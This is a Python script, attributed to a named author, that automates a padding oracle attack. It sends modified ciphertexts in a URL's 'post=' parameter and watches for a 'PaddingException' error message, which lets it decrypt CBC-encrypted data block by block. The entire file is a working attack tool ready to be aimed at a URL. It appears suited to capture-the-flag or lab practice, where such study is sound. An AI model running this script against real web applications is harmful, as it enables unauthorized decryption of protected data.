#!/usr/bin/python3

# Gavin Zimmerman
# Padding Oracle Automation Script


# Modules
import pycurl
import base64
import sys
import time
from io import BytesIO ## for Python 3


# Configuration
TARGET_QUERY = "post="
PADDING_ERROR_MSG="PaddingException"

def decode(msg):
	return base64.b64decode(msg.replace('!','/').replace('-','+').replace('~','='))

def encode(msg):
	return base64.b64encode(msg).decode("utf-8") .replace('/','!').replace('+','-').replace('=','~')

def makeRequest(c, url):
	response= BytesIO()
	c.setopt(c.WRITEDATA, response)
	c.setopt(c.URL,url)
	c.perform()
	return response.getvalue().decode('utf-8')

	
# Output
def printRunning(domain, blocks):
	print("Running Padding Oracle Attack on {}\n  {} Blocks".format(domain, blocks))
	
def printResults(plaintext, requests, start):
	print("Finished (Took {} seconds; {} net requests)".format(time.time()-start,requests))
	print("Plaintext:")
	print(plaintext)

	

# Main Program
def main(args):
	args[1]=int(args[1])
	if (len(args)<=2):
		return print("Expected 2 args: <Block Size> <Url>")
		
	elif not (args[1]==16 or args[1]==24 or args[1]==32):
		return print("Invalid 1st arg")
		
	elif (args[2].find(TARGET_QUERY)==-1):
		return print("Expected url with post query")
		
	# Prep input and variables
	bl_size = args[1]
	target_url = args[2]
	sep = target_url.find(TARGET_QUERY)+len(TARGET_QUERY)
	domain = target_url[0:sep]
	
	ciph_text = decode(target_url[sep:])
	size=len(ciph_text)
	blocks=int(size/bl_size)
	
	if (blocks%1!=0):
		return print("Message not multiple of block size")
	
	decrypted= bytearray(len(ciph_text))	# Decrypted bytes (still xored with previous cipher block)
	plaintext= bytearray(len(ciph_text))	# Plaintext bytes
	
	c=pycurl.Curl()
	last_byte=0		# Assume cipher text is made of characters closely related on ascii table, use previous plaintext byte to predict next
	
	# Performance Variables
	requests=0
	perf_st=time.time()
	printRunning(domain, blocks-1)
	
	# Attack
	for block in range(blocks-1, 0, -1):
		rel_ciph = ciph_text[0:(block+1)*bl_size]	# Relative cipher text
		
		for byte in range(bl_size-1,-1,-1):
			tar_byte= (block*bl_size)+byte 	# Index on yte currently being decrypted
			byte_offset= (bl_size-byte) 	# Byte offset
			man_byte= tar_byte-bl_size		# Index on byte being manipulated
			
			# Form new request query template
			
			req_temp= rel_ciph[0:man_byte-1]+ bytearray([rel_ciph[man_byte-1]^byte,0])
			for i in range(1, byte_offset):
				req_temp+= bytearray([decrypted[tar_byte+i] ^ byte_offset])   # Decrypted with offset
			
			req_temp+= rel_ciph[man_byte+byte_offset:]
			
			
			for d in range(0,255):
				d_i = d ^ ciph_text[man_byte] ^ last_byte ^ byte_offset		# Predict byte
				
				req_query=req_temp[0:man_byte] + bytearray([d_i]) + req_temp[man_byte+1:]		# Manipulate byte
				
				url=domain+encode(req_query)
				
				result = makeRequest(c, url)
				requests+=1
				
				if (result.find(PADDING_ERROR_MSG)==-1):
					dec_byte = d_i^byte_offset

					plain_byte = dec_byte ^ ciph_text[man_byte]
					last_byte = plain_byte

					decrypted[tar_byte]=dec_byte
					plaintext[tar_byte]=plain_byte
					print('#', end='')
					break
		print(' - Block {} Decrypted'.format(block))
	
	printResults(plaintext[bl_size:size-(plaintext[-1])].decode('utf-8'), requests, perf_st)
	
	
	




if __name__ == '__main__':
    main(sys.argv)
